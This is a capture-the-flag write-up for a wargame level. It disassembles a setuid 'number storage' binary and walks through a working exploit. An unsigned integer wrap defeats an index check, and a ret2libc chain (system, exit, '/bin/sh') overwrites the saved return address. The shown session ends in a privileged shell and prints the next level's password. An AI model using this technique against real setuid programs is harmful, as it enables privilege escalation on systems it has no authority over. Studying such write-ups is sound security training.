RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level07/level07
level07@OverRide:~$ ls -l
total 12
-rwsr-s---+ 1 level08 users 11744 Sep 10  2016 level07


level07@OverRide:~$ ./level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: read
 Index: 10
 Number at data[10] is 0
 Completed read command successfully
Input command: command
Input command: read
 Index: 1000
Segmentation fault (core dumped)
level07@OverRide:~$ ./level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: read 50 
 Index: 50
 Number at data[50] is 0
 Completed read 50 command successfully
Input command: store  
 Number: 42
 Index: 1000 
Segmentation fault (core dumped)

(gdb) info functions 
All defined functions:

Non-debugging symbols:
0x0804842c  _init
0x08048470  printf
0x08048470  printf@plt
0x08048480  fflush
0x08048480  fflush@plt
0x08048490  getchar
0x08048490  getchar@plt
0x080484a0  fgets
0x080484a0  fgets@plt
0x080484b0  __stack_chk_fail
0x080484b0  __stack_chk_fail@plt
0x080484c0  puts
0x080484c0  puts@plt
0x080484d0  __gmon_start__
0x080484d0  __gmon_start__@plt
0x080484e0  __libc_start_main
0x080484e0  __libc_start_main@plt
0x080484f0  memset
0x080484f0  memset@plt
0x08048500  __isoc99_scanf
0x08048500  __isoc99_scanf@plt
0x08048510  _start
0x08048540  __do_global_dtors_aux
0x080485a0  frame_dummy
0x080485c4  clear_stdin
0x080485e7  get_unum
0x0804861f  prog_timeout
0x08048630  store_number
0x080486d7  read_number
0x08048723  main
0x08048a00  __libc_csu_init
0x08048a70  __libc_csu_fini
0x08048a72  __i686.get_pc_thunk.bx
0x08048a80  __do_global_ctors_aux
0x08048aac  _fini


(gdb) disas main 
Dump of assembler code for function main:
   0x08048723 <+0>:	push   %ebp
   0x08048724 <+1>:	mov    %esp,%ebp
   0x08048726 <+3>:	push   %edi
   0x08048727 <+4>:	push   %esi
   0x08048728 <+5>:	push   %ebx
   0x08048729 <+6>:	and    $0xfffffff0,%esp
   0x0804872c <+9>:	sub    $0x1d0,%esp
   0x08048732 <+15>:	mov    0xc(%ebp),%eax
   0x08048735 <+18>:	mov    %eax,0x1c(%esp)
   0x08048739 <+22>:	mov    0x10(%ebp),%eax
   0x0804873c <+25>:	mov    %eax,0x18(%esp)
   0x08048740 <+29>:	mov    %gs:0x14,%eax
   0x08048746 <+35>:	mov    %eax,0x1cc(%esp)
   0x0804874d <+42>:	xor    %eax,%eax
   0x0804874f <+44>:	movl   $0x0,0x1b4(%esp)
   0x0804875a <+55>:	movl   $0x0,0x1b8(%esp)
   0x08048765 <+66>:	movl   $0x0,0x1bc(%esp)
   0x08048770 <+77>:	movl   $0x0,0x1c0(%esp)
   0x0804877b <+88>:	movl   $0x0,0x1c4(%esp)
   0x08048786 <+99>:	movl   $0x0,0x1c8(%esp)
   0x08048791 <+110>:	lea    0x24(%esp),%ebx
   0x08048795 <+114>:	mov    $0x0,%eax
   0x0804879a <+119>:	mov    $0x64,%edx
   0x0804879f <+124>:	mov    %ebx,%edi
   0x080487a1 <+126>:	mov    %edx,%ecx
   0x080487a3 <+128>:	rep stos %eax,%es:(%edi)
   0x080487a5 <+130>:	jmp    0x80487ea <main+199>
   0x080487a7 <+132>:	mov    0x1c(%esp),%eax
   0x080487ab <+136>:	mov    (%eax),%eax
   0x080487ad <+138>:	movl   $0xffffffff,0x14(%esp)
   0x080487b5 <+146>:	mov    %eax,%edx
   0x080487b7 <+148>:	mov    $0x0,%eax
   0x080487bc <+153>:	mov    0x14(%esp),%ecx
   0x080487c0 <+157>:	mov    %edx,%edi
   0x080487c2 <+159>:	repnz scas %es:(%edi),%al
   0x080487c4 <+161>:	mov    %ecx,%eax
   0x080487c6 <+163>:	not    %eax
   0x080487c8 <+165>:	lea    -0x1(%eax),%edx
   0x080487cb <+168>:	mov    0x1c(%esp),%eax
   0x080487cf <+172>:	mov    (%eax),%eax
   0x080487d1 <+174>:	mov    %edx,0x8(%esp)
   0x080487d5 <+178>:	movl   $0x0,0x4(%esp)
   0x080487dd <+186>:	mov    %eax,(%esp)
   0x080487e0 <+189>:	call   0x80484f0 <memset@plt>
   0x080487e5 <+194>:	addl   $0x4,0x1c(%esp)
   0x080487ea <+199>:	mov    0x1c(%esp),%eax
   0x080487ee <+203>:	mov    (%eax),%eax
   0x080487f0 <+205>:	test   %eax,%eax
   0x080487f2 <+207>:	jne    0x80487a7 <main+132>
   0x080487f4 <+209>:	jmp    0x8048839 <main+278>
   0x080487f6 <+211>:	mov    0x18(%esp),%eax
   0x080487fa <+215>:	mov    (%eax),%eax
   0x080487fc <+217>:	movl   $0xffffffff,0x14(%esp)
   0x08048804 <+225>:	mov    %eax,%edx
   0x08048806 <+227>:	mov    $0x0,%eax
   0x0804880b <+232>:	mov    0x14(%esp),%ecx
   0x0804880f <+236>:	mov    %edx,%edi
   0x08048811 <+238>:	repnz scas %es:(%edi),%al
   0x08048813 <+240>:	mov    %ecx,%eax
   0x08048815 <+242>:	not    %eax
   0x08048817 <+244>:	lea    -0x1(%eax),%edx
   0x0804881a <+247>:	mov    0x18(%esp),%eax
   0x0804881e <+251>:	mov    (%eax),%eax
   0x08048820 <+253>:	mov    %edx,0x8(%esp)
   0x08048824 <+257>:	movl   $0x0,0x4(%esp)
   0x0804882c <+265>:	mov    %eax,(%esp)
   0x0804882f <+268>:	call   0x80484f0 <memset@plt>
   0x08048834 <+273>:	addl   $0x4,0x18(%esp)
   0x08048839 <+278>:	mov    0x18(%esp),%eax
   0x0804883d <+282>:	mov    (%eax),%eax
   0x0804883f <+284>:	test   %eax,%eax
   0x08048841 <+286>:	jne    0x80487f6 <main+211>
   0x08048843 <+288>:	movl   $0x8048b38,(%esp)
   0x0804884a <+295>:	call   0x80484c0 <puts@plt>
   0x0804884f <+300>:	mov    $0x8048d4b,%eax
   0x08048854 <+305>:	mov    %eax,(%esp)
   0x08048857 <+308>:	call   0x8048470 <printf@plt>
   0x0804885c <+313>:	movl   $0x1,0x1b4(%esp)
   0x08048867 <+324>:	mov    0x804a040,%eax
   0x0804886c <+329>:	mov    %eax,0x8(%esp)
   0x08048870 <+333>:	movl   $0x14,0x4(%esp)
   0x08048878 <+341>:	lea    0x1b8(%esp),%eax
   0x0804887f <+348>:	mov    %eax,(%esp)
   0x08048882 <+351>:	call   0x80484a0 <fgets@plt>
   0x08048887 <+356>:	lea    0x1b8(%esp),%eax
   0x0804888e <+363>:	movl   $0xffffffff,0x14(%esp)
   0x08048896 <+371>:	mov    %eax,%edx
   0x08048898 <+373>:	mov    $0x0,%eax
   0x0804889d <+378>:	mov    0x14(%esp),%ecx
   0x080488a1 <+382>:	mov    %edx,%edi
   0x080488a3 <+384>:	repnz scas %es:(%edi),%al
   0x080488a5 <+386>:	mov    %ecx,%eax
   0x080488a7 <+388>:	not    %eax
   0x080488a9 <+390>:	sub    $0x1,%eax
   0x080488ac <+393>:	sub    $0x1,%eax
   0x080488af <+396>:	movb   $0x0,0x1b8(%esp,%eax,1)
   0x080488b7 <+404>:	lea    0x1b8(%esp),%eax
   0x080488be <+411>:	mov    %eax,%edx
   0x080488c0 <+413>:	mov    $0x8048d5b,%eax
   0x080488c5 <+418>:	mov    $0x5,%ecx
   0x080488ca <+423>:	mov    %edx,%esi
   0x080488cc <+425>:	mov    %eax,%edi
   0x080488ce <+427>:	repz cmpsb %es:(%edi),%ds:(%esi)
   0x080488d0 <+429>:	seta   %dl
   0x080488d3 <+432>:	setb   %al
   0x080488d6 <+435>:	mov    %edx,%ecx
   0x080488d8 <+437>:	sub    %al,%cl
   0x080488da <+439>:	mov    %ecx,%eax
   0x080488dc <+441>:	movsbl %al,%eax
   0x080488df <+444>:	test   %eax,%eax
   0x080488e1 <+446>:	jne    0x80488f8 <main+469>
   0x080488e3 <+448>:	lea    0x24(%esp),%eax
   0x080488e7 <+452>:	mov    %eax,(%esp)
   0x080488ea <+455>:	call   0x8048630 <store_number>
   0x080488ef <+460>:	mov    %eax,0x1b4(%esp)
   0x080488f6 <+467>:	jmp    0x8048965 <main+578>
   0x080488f8 <+469>:	lea    0x1b8(%esp),%eax
   0x080488ff <+476>:	mov    %eax,%edx
   0x08048901 <+478>:	mov    $0x8048d61,%eax
   0x08048906 <+483>:	mov    $0x4,%ecx
   0x0804890b <+488>:	mov    %edx,%esi
   0x0804890d <+490>:	mov    %eax,%edi
   0x0804890f <+492>:	repz cmpsb %es:(%edi),%ds:(%esi)
   0x08048911 <+494>:	seta   %dl
   0x08048914 <+497>:	setb   %al
   0x08048917 <+500>:	mov    %edx,%ecx
   0x08048919 <+502>:	sub    %al,%cl
   0x0804891b <+504>:	mov    %ecx,%eax
   0x0804891d <+506>:	movsbl %al,%eax
   0x08048920 <+509>:	test   %eax,%eax
   0x08048922 <+511>:	jne    0x8048939 <main+534>
   0x08048924 <+513>:	lea    0x24(%esp),%eax
   0x08048928 <+517>:	mov    %eax,(%esp)
   0x0804892b <+520>:	call   0x80486d7 <read_number>
   0x08048930 <+525>:	mov    %eax,0x1b4(%esp)
   0x08048937 <+532>:	jmp    0x8048965 <main+578>
   0x08048939 <+534>:	lea    0x1b8(%esp),%eax
   0x08048940 <+541>:	mov    %eax,%edx
   0x08048942 <+543>:	mov    $0x8048d66,%eax
   0x08048947 <+548>:	mov    $0x4,%ecx
   0x0804894c <+553>:	mov    %edx,%esi
   0x0804894e <+555>:	mov    %eax,%edi
   0x08048950 <+557>:	repz cmpsb %es:(%edi),%ds:(%esi)
   0x08048952 <+559>:	seta   %dl
   0x08048955 <+562>:	setb   %al
   0x08048958 <+565>:	mov    %edx,%ecx
   0x0804895a <+567>:	sub    %al,%cl
   0x0804895c <+569>:	mov    %ecx,%eax
   0x0804895e <+571>:	movsbl %al,%eax
   0x08048961 <+574>:	test   %eax,%eax
   0x08048963 <+576>:	je     0x80489cf <main+684>
   0x08048965 <+578>:	cmpl   $0x0,0x1b4(%esp)
   0x0804896d <+586>:	je     0x8048989 <main+614>
   0x0804896f <+588>:	mov    $0x8048d6b,%eax
   0x08048974 <+593>:	lea    0x1b8(%esp),%edx
   0x0804897b <+600>:	mov    %edx,0x4(%esp)
   0x0804897f <+604>:	mov    %eax,(%esp)
   0x08048982 <+607>:	call   0x8048470 <printf@plt>
   0x08048987 <+612>:	jmp    0x80489a1 <main+638>
   0x08048989 <+614>:	mov    $0x8048d88,%eax
   0x0804898e <+619>:	lea    0x1b8(%esp),%edx
   0x08048995 <+626>:	mov    %edx,0x4(%esp)
   0x08048999 <+630>:	mov    %eax,(%esp)
   0x0804899c <+633>:	call   0x8048470 <printf@plt>
   0x080489a1 <+638>:	lea    0x1b8(%esp),%eax
   0x080489a8 <+645>:	movl   $0x0,(%eax)
   0x080489ae <+651>:	movl   $0x0,0x4(%eax)
   0x080489b5 <+658>:	movl   $0x0,0x8(%eax)
   0x080489bc <+665>:	movl   $0x0,0xc(%eax)
   0x080489c3 <+672>:	movl   $0x0,0x10(%eax)
   0x080489ca <+679>:	jmp    0x804884f <main+300>
   0x080489cf <+684>:	nop
   0x080489d0 <+685>:	mov    $0x0,%eax
   0x080489d5 <+690>:	mov    0x1cc(%esp),%esi
   0x080489dc <+697>:	xor    %gs:0x14,%esi
   0x080489e3 <+704>:	je     0x80489ea <main+711>
   0x080489e5 <+706>:	call   0x80484b0 <__stack_chk_fail@plt>
   0x080489ea <+711>:	lea    -0xc(%ebp),%esp
   0x080489ed <+714>:	pop    %ebx
   0x080489ee <+715>:	pop    %esi
   0x080489ef <+716>:	pop    %edi
   0x080489f0 <+717>:	pop    %ebp
   0x080489f1 <+718>:	ret    
End of assembler dump.

(gdb) disas store_number
Dump of assembler code for function store_number:
   0x08048630 <+0>:	push   %ebp
   0x08048631 <+1>:	mov    %esp,%ebp
   0x08048633 <+3>:	sub    $0x28,%esp
   0x08048636 <+6>:	movl   $0x0,-0x10(%ebp)
   0x0804863d <+13>:	movl   $0x0,-0xc(%ebp)
   0x08048644 <+20>:	mov    $0x8048ad3,%eax
   0x08048649 <+25>:	mov    %eax,(%esp)
   0x0804864c <+28>:	call   0x8048470 <printf@plt>
   0x08048651 <+33>:	call   0x80485e7 <get_unum>
   0x08048656 <+38>:	mov    %eax,-0x10(%ebp)
   0x08048659 <+41>:	mov    $0x8048add,%eax
   0x0804865e <+46>:	mov    %eax,(%esp)
   0x08048661 <+49>:	call   0x8048470 <printf@plt>
   0x08048666 <+54>:	call   0x80485e7 <get_unum>
   0x0804866b <+59>:	mov    %eax,-0xc(%ebp)
   0x0804866e <+62>:	mov    -0xc(%ebp),%ecx
   0x08048671 <+65>:	mov    $0xaaaaaaab,%edx
   0x08048676 <+70>:	mov    %ecx,%eax
   0x08048678 <+72>:	mul    %edx
   0x0804867a <+74>:	shr    %edx
   0x0804867c <+76>:	mov    %edx,%eax
   0x0804867e <+78>:	add    %eax,%eax
   0x08048680 <+80>:	add    %edx,%eax
   0x08048682 <+82>:	mov    %ecx,%edx
   0x08048684 <+84>:	sub    %eax,%edx
   0x08048686 <+86>:	test   %edx,%edx
   0x08048688 <+88>:	je     0x8048697 <store_number+103>
   0x0804868a <+90>:	mov    -0x10(%ebp),%eax
   0x0804868d <+93>:	shr    $0x18,%eax
   0x08048690 <+96>:	cmp    $0xb7,%eax
   0x08048695 <+101>:	jne    0x80486c2 <store_number+146>
   0x08048697 <+103>:	movl   $0x8048ae6,(%esp)
   0x0804869e <+110>:	call   0x80484c0 <puts@plt>
   0x080486a3 <+115>:	movl   $0x8048af8,(%esp)
   0x080486aa <+122>:	call   0x80484c0 <puts@plt>
   0x080486af <+127>:	movl   $0x8048ae6,(%esp)
   0x080486b6 <+134>:	call   0x80484c0 <puts@plt>
   0x080486bb <+139>:	mov    $0x1,%eax
   0x080486c0 <+144>:	jmp    0x80486d5 <store_number+165>
   0x080486c2 <+146>:	mov    -0xc(%ebp),%eax
   0x080486c5 <+149>:	shl    $0x2,%eax
   0x080486c8 <+152>:	add    0x8(%ebp),%eax
   0x080486cb <+155>:	mov    -0x10(%ebp),%edx
   0x080486ce <+158>:	mov    %edx,(%eax)
   0x080486d0 <+160>:	mov    $0x0,%eax
   0x080486d5 <+165>:	leave  
   0x080486d6 <+166>:	ret    
End of assembler dump.


(gdb) disas read_number 
Dump of assembler code for function read_number:
   0x080486d7 <+0>:	push   %ebp
   0x080486d8 <+1>:	mov    %esp,%ebp
   0x080486da <+3>:	sub    $0x28,%esp
   0x080486dd <+6>:	movl   $0x0,-0xc(%ebp)
   0x080486e4 <+13>:	mov    $0x8048add,%eax
   0x080486e9 <+18>:	mov    %eax,(%esp)
   0x080486ec <+21>:	call   0x8048470 <printf@plt>
   0x080486f1 <+26>:	call   0x80485e7 <get_unum>
   0x080486f6 <+31>:	mov    %eax,-0xc(%ebp)
   0x080486f9 <+34>:	mov    -0xc(%ebp),%eax
   0x080486fc <+37>:	shl    $0x2,%eax
   0x080486ff <+40>:	add    0x8(%ebp),%eax
   0x08048702 <+43>:	mov    (%eax),%edx
   0x08048704 <+45>:	mov    $0x8048b1b,%eax
   0x08048709 <+50>:	mov    %edx,0x8(%esp)
   0x0804870d <+54>:	mov    -0xc(%ebp),%edx
   0x08048710 <+57>:	mov    %edx,0x4(%esp)
   0x08048714 <+61>:	mov    %eax,(%esp)
   0x08048717 <+64>:	call   0x8048470 <printf@plt>
   0x0804871c <+69>:	mov    $0x0,%eax
   0x08048721 <+74>:	leave  
   0x08048722 <+75>:	ret    
End of assembler dump.



undefined4 main(undefined4 param_1,int *param_2,int *param_3)

{
  char cVar1;
  byte bVar2;
  int iVar3;
  uint uVar4;
  byte *pbVar5;
  undefined4 *puVar6;
  char *pcVar7;
  byte *pbVar8;
  int in_GS_OFFSET;
  bool bVar9;
  bool bVar10;
  bool bVar11;
  byte bVar12;
  int *local_1c8;
  int *local_1c4;
  undefined4 local_1bc [100];
  undefined4 local_2c;
  byte local_28 [20];
  int local_14;
  
  bVar12 = 0;
  local_1c4 = param_2;
  local_1c8 = param_3;
  local_14 = *(int *)(in_GS_OFFSET + 0x14);
  local_2c = 0;
  local_28[0] = 0;
  local_28[1] = 0;
  local_28[2] = 0;
  local_28[3] = 0;
  local_28[4] = 0;
  local_28[5] = 0;
  local_28[6] = 0;
  local_28[7] = 0;
  local_28[8] = 0;
  local_28[9] = 0;
  local_28[10] = 0;
  local_28[0xb] = 0;
  local_28[0xc] = 0;
  local_28[0xd] = 0;
  local_28[0xe] = 0;
  local_28[0xf] = 0;
  local_28[0x10] = 0;
  local_28[0x11] = 0;
  local_28[0x12] = 0;
  local_28[0x13] = 0;
  puVar6 = local_1bc;
  for (iVar3 = 100; iVar3 != 0; iVar3 = iVar3 + -1) {
    *puVar6 = 0;
    puVar6 = puVar6 + 1;
  }
  for (; *local_1c4 != 0; local_1c4 = local_1c4 + 1) {
    uVar4 = 0xffffffff;
    pcVar7 = (char *)*local_1c4;
    do {
      if (uVar4 == 0) break;
      uVar4 = uVar4 - 1;
      cVar1 = *pcVar7;
      pcVar7 = pcVar7 + (uint)bVar12 * -2 + 1;
    } while (cVar1 != '\0');
    memset((void *)*local_1c4,0,~uVar4 - 1);
  }
  for (; *local_1c8 != 0; local_1c8 = local_1c8 + 1) {
    uVar4 = 0xffffffff;
    pcVar7 = (char *)*local_1c8;
    do {
      if (uVar4 == 0) break;
      uVar4 = uVar4 - 1;
      cVar1 = *pcVar7;
      pcVar7 = pcVar7 + (uint)bVar12 * -2 + 1;
    } while (cVar1 != '\0');
    memset((void *)*local_1c8,0,~uVar4 - 1);
  }
  puts(
      "----------------------------------------------------\n  Welcome to wil\'s crappy number stora ge service!   \n----------------------------------------------------\n Commands:                                          \n    store - store a number into the data storage    \n    read  - read a number from the data storage     \n    quit  - exit the program                        \n----------------------------------------------------\n   wil has reserved some storage :>                 \n----------------------------------------------------\n"
      );
  do {
    printf("Input command: ");
    local_2c = 1;
    fgets((char *)local_28,0x14,stdin);
    uVar4 = 0xffffffff;
    pbVar5 = local_28;
    do {
      if (uVar4 == 0) break;
      uVar4 = uVar4 - 1;
      bVar2 = *pbVar5;
      pbVar5 = pbVar5 + (uint)bVar12 * -2 + 1;
    } while (bVar2 != 0);
    uVar4 = ~uVar4;
    bVar9 = uVar4 == 1;
    bVar11 = uVar4 == 2;
    *(undefined1 *)((int)&local_2c + uVar4 + 2) = 0;
    iVar3 = 5;
    pbVar5 = local_28;
    pbVar8 = (byte *)"store";
    do {
      if (iVar3 == 0) break;
      iVar3 = iVar3 + -1;
      bVar9 = *pbVar5 < *pbVar8;
      bVar11 = *pbVar5 == *pbVar8;
      pbVar5 = pbVar5 + (uint)bVar12 * -2 + 1;
      pbVar8 = pbVar8 + (uint)bVar12 * -2 + 1;
    } while (bVar11);
    bVar10 = false;
    bVar9 = (!bVar9 && !bVar11) == bVar9;
    if (bVar9) {
      local_2c = store_number(local_1bc);
    }
    else {
      iVar3 = 4;
      pbVar5 = local_28;
      pbVar8 = &DAT_08048d61;
      do {
        if (iVar3 == 0) break;
        iVar3 = iVar3 + -1;
        bVar10 = *pbVar5 < *pbVar8;
        bVar9 = *pbVar5 == *pbVar8;
        pbVar5 = pbVar5 + (uint)bVar12 * -2 + 1;
        pbVar8 = pbVar8 + (uint)bVar12 * -2 + 1;
      } while (bVar9);
      bVar11 = false;
      bVar9 = (!bVar10 && !bVar9) == bVar10;
      if (bVar9) {
        local_2c = read_number(local_1bc);
      }
      else {
        iVar3 = 4;
        pbVar5 = local_28;
        pbVar8 = &DAT_08048d66;
        do {
          if (iVar3 == 0) break;
          iVar3 = iVar3 + -1;
          bVar11 = *pbVar5 < *pbVar8;
          bVar9 = *pbVar5 == *pbVar8;
          pbVar5 = pbVar5 + (uint)bVar12 * -2 + 1;
          pbVar8 = pbVar8 + (uint)bVar12 * -2 + 1;
        } while (bVar9);
        if ((!bVar11 && !bVar9) == bVar11) {
          if (local_14 == *(int *)(in_GS_OFFSET + 0x14)) {
            return 0;
          }
                    /* WARNING: Subroutine does not return */
          __stack_chk_fail();
        }
      }
    }
    if (local_2c == 0) {
      printf(" Completed %s command successfully\n",local_28);
    }
    else {
      printf(" Failed to do %s command\n",local_28);
    }
    local_28[0] = 0;
    local_28[1] = 0;
    local_28[2] = 0;
    local_28[3] = 0;
    local_28[4] = 0;
    local_28[5] = 0;
    local_28[6] = 0;
    local_28[7] = 0;
    local_28[8] = 0;
    local_28[9] = 0;
    local_28[10] = 0;
    local_28[0xb] = 0;
    local_28[0xc] = 0;
    local_28[0xd] = 0;
    local_28[0xe] = 0;
    local_28[0xf] = 0;
    local_28[0x10] = 0;
    local_28[0x11] = 0;
    local_28[0x12] = 0;
    local_28[0x13] = 0;
  } while( true );
}



undefined4 read_number(int param_1)

{
  int iVar1;
  
  printf(" Index: ");
  iVar1 = get_unum();
  printf(" Number at data[%u] is %u\n",iVar1,*(undefined4 *)(iVar1 * 4 + param_1));
  return 0;
}


undefined4 store_number(int param_1)

{
  uint uVar1;
  uint uVar2;
  undefined4 uVar3;
  
  printf(" Number: ");
  uVar1 = get_unum();
  printf(" Index: ");
  uVar2 = get_unum();
  if ((uVar2 % 3 == 0) || (uVar1 >> 0x18 == 0xb7)) {
    puts(" *** ERROR! ***");
    puts("   This index is reserved for wil!");
    puts(" *** ERROR! ***");
    uVar3 = 1;
  }
  else {
    *(uint *)(uVar2 * 4 + param_1) = uVar1;
    uVar3 = 0;
  }
  return uVar3;
}


(gdb) info frame
Stack level 0, frame at 0xffffd6a0:
 eip = 0x8048729 in main; saved eip 0xf7e45513
 Arglist at 0xffffd698, args: 
 Locals at 0xffffd698, Previous frame's sp is 0xffffd6a0
 Saved registers:
  ebp at 0xffffd698, eip at 0xffffd69c


SAVED EIP ---> 0xffffd69c




   0x080488e3 <+448>:	lea    0x24(%esp),%eax
   0x080488e7 <+452>:	mov    %eax,(%esp)
   0x080488ea <+455>:	call   0x8048630 <store_number>

undefined4 local_1bc [100];
local_2c = store_number(local_1bc);


local_1bc -> 0x24(%esp)

(gdb) b *0x0804884f
Breakpoint 2 at 0x804884f
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/users/level07/level07 

Breakpoint 1, 0x08048729 in main ()
(gdb) c
Continuing.
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------


Breakpoint 2, 0x0804884f in main ()
(gdb) p $esp+0x24
$2 = (void *) 0xffffd4d4


table ----> 0xffffd4d4



0xffffd69c - 0xffffd4d4 = 456

(int size of 4 bytes)
456 / 4 bytes = 114 characters

114 % 3 == 0 ---> problem


overflow to get 456 bytes / 114 characters : 

uintmax : 4294967295
overflow = 0 : 4294967296

    *(uint *)(uVar2 * 4 + param_1) = uVar1;

level07@OverRide:~$ python -c "print (4294967296 / 4) & 0xFFFFFFFF"
1073741824
level07@OverRide:~$ python -c "print ((1073741824 + 114) * 4) & 0xFFFFFFFF"
456

456 bytes / 4 = 114 characters

1073741824 + 114 = 1073741938


-----

 [saved EIP]	 + [EBP+8 = ret adr]+ [EBP+12 = arg 1]
[address system] + [address exit] + [arg system]
└───────┬──────┘ + └──────┬─────┘ + └─────┬────┘
		4		 +		  4		  +		  4			  		

(gdb) p system 
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) p exit 
$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
(gdb) info proc map
process 2592
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/users/level07/level07
	 0x8049000  0x804a000     0x1000     0x1000 /home/users/level07/level07
	 0x804a000  0x804b000     0x1000     0x2000 /home/users/level07/level07
	0xf7e2b000 0xf7e2c000     0x1000        0x0 
	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
	0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
	0xf7fd0000 0xf7fd4000     0x4000        0x0 
	0xf7fda000 0xf7fdb000     0x1000        0x0 
	0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
	0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
	0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
	0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
(gdb) find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
0xf7f897ec
1 pattern found.

0xf7e6aed0	0xf7e5eb70	0xf7f897ec

needed to be enter as uint

system	:	0xf7e6aed0	:	4159090384

exit	:	0xf7e5eb70	:	4159040368

/bin/sh	:	0xf7f897ec	:	4160264172


table[114]	:	eip		:	index 1073741938	:	system	:	0xf7e6aed0	:	4159090384

table[115]	:	ebp+8	:	index 115			:	exit	:	0xf7e5eb70	:	4159040368

table[116]	:	ebp+12	:	index 116			:	/bin/sh	:	0xf7f897ec	:	4160264172



value: 4159090384
index: 1073741938

value: 4159040368
index: 115

value: 4160264172
index: 116


level07@OverRide:~$ ./level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: store	
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4159040368
 Index: 115
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ id
uid=1007(level07) gid=1007(level07) euid=1008(level08) egid=100(users) groups=1008(level08),100(users),1007(level07)
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
$ exit

____________


without exit address :

level07@OverRide:~$ ./level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ id
uid=1007(level07) gid=1007(level07) euid=1008(level08) egid=100(users) groups=1008(level08),100(users),1007(level07)
$ cat /home/users/level08/.pass       
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
$ exit
Segmentation fault (core dumped)


---> Segfault, but works (even if the stack kanary is on...)


